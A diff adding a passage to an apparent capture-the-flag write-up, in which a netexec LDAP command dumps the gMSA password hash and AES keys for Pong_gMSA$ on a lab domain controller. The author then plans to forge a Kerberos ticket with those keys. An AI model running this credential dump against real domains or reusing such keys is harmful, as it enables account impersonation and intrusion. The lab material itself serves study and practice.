@@ -645,7 +645,16 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Now i have a new TGT, ill make sure to export it
 
 ```python
-
+❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb --use-kcache --gmsa           
+LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:PING.HTB) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc2.pong.htb    389    DC2              [+] PING.HTB\c.roberts from ccache 
+LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
+LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 989bd748ac8dd0b71ab24edccc9fc012     PrincipalsAllowedToReadPassword: gMSA Managers
+LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           aes128-cts-hmac-sha1-96: 97cefa17dcaec66d9b52a97be398acf0
+LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           aes256-cts-hmac-sha1-96: 725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
 ```
+
+I can now use these AES keys to make a ticket as this user
+
 
 
